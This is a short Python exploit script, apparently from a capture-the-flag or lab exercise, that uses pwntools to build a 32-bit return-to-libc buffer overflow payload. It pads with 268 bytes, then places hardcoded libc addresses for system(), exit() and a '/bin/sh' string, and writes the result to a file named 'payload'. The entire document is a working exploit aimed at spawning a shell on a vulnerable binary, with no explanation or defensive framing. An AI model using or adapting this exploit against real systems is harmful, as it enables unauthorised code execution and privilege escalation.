#!/usr/bin/python3
from pwn import *

junk = b"A" * 268

libc = ELF("/usr/lib32/libc.so.6")
libc_base = 0xf7d75000

system_addr = p32(libc_base + libc.sym["system"])
exit_addr = p32(libc_base + libc.sym["exit"])
binsh_addr = p32(0xF7F30DDC)

payload = junk + system_addr + exit_addr + binsh_addr 

with open("payload", "wb") as f:
        f.write(payload)
